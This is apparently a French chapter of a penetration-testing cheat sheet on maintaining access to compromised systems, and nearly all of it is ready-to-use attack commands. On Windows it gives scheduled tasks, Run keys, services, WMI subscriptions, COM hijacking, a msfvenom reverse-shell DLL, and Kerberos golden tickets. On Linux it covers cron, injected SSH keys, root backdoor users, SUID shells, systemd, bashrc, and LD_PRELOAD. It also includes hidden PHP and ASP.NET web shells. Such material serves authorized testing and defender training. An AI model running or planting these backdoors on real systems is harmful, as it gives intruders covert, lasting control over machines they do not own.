# 🔒 Phase 5: Persistance

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Objectif :** Conserver l’accès au système compromis, même après un redémarrage ou une détection.

> **Précision :** les chaînes `AAAA...your_key...`, `IEX(payload)` et les hashes abrégés sont des espaces réservés. Un exécutable utilisé comme service Windows doit respecter le fonctionnement attendu d’un service. Dans l’exemple cron, le traitement de `\n` par `echo` dépend du shell ; le texte est conservé tel quel. Les extraits de code ne constituent pas une implémentation complète.

---

## 🖥️ Persistance Windows

### Tâches planifiées
```cmd
# Créer une tâche planifiée (exécution sous SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Avec un utilisateur donné
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Au démarrage
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Toutes les heures
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Lister les tâches
schtasks /query /fo LIST /v

# Supprimer la tâche
schtasks /delete /tn "TaskName" /f
```

### Clés Run du Registre
```cmd
# HKCU — utilisateur courant (droits administrateur non requis)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM — tous les utilisateurs (droits administrateur requis)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (exécution unique, puis suppression de l’entrée)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Dossier de démarrage
```cmd
# Utilisateur courant
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Tous les utilisateurs (droits administrateur requis)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Services
```cmd
# Créer un service (droits administrateur requis)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modifier un service existant
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### Abonnements aux événements WMI
```powershell
# Créer une persistance WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### Détournement de DLL / ordre de recherche
```cmd
# Rechercher des possibilités de détournement de DLL
# Placer une DLL malveillante dans le répertoire de l’application
# Cibles courantes :
# - Programmes utilisant des chemins de DLL non absolus
# - DLL absentes

# Créer une DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Détournement COM
```powershell
# Rechercher les objets COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Créer le détournement
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden Ticket — accès persistant avec les droits d’administrateur du domaine
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket — accès persistant à un service
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Persistance Linux

### Tâches cron
```bash
# Crontab de l’utilisateur
crontab -e
# Ajouter : * * * * * /tmp/shell.sh

# Crontab système
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Répertoires cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### Clés SSH
```bash
# Ajouter votre clé publique à authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Accès root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Utilisateur servant de porte dérobée
```bash
# Ajouter un utilisateur avec les privilèges root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Ou l’ajouter directement à /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Binaire SUID
```bash
# Copier bash et activer le bit SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Exécuter en tant que root
/tmp/.hidden -p
```

### Service systemd
```bash
# Créer le fichier du service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Activer et démarrer
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Ajouter au bashrc de l’utilisateur
echo '/tmp/shell &' >> ~/.bashrc

# Ajouter au profil global
echo '/tmp/shell &' >> /etc/profile

# Ajouter à bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Créer une bibliothèque partagée malveillante
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Ajouter à LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web shell (interface de commande côté serveur)
```bash
# Web shell PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Plus dissimulé
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Persistance web

### Emplacements des web shells
```bash
# Emplacements courants des web shells
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### Web shell ASP.NET
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Aide-mémoire

### Méthodes de persistance Windows

| Méthode | Emplacement | Privilège |
|--------|----------|-----------|
| Clés Run du Registre | HKCU/HKLM | Utilisateur/administrateur |
| Tâche planifiée | Planificateur de tâches | Utilisateur/administrateur |
| Dossier de démarrage | AppData/ProgramData | Utilisateur/administrateur |
| Service | Services | Administrateur |
| WMI | Abonnement WMI | Administrateur |
| Détournement COM | HKCU CLSID | Utilisateur |

### Méthodes de persistance Linux

| Méthode | Emplacement | Privilège |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| Clés SSH | ~/.ssh/authorized_keys | Utilisateur |
| SUID | Binaire avec le bit +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Utilisateur |

---

## 🔗 Fiches associées

- [PowerShell](../../PowerShell/README.md)
- [Commandes Linux](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Phase précédente :** [← 04 - Déplacement latéral](./04-Lateral-Movement.fr.md)

**Phase suivante :** [06 - Évasion des défenses →](./06-Defense-Evasion.fr.md)
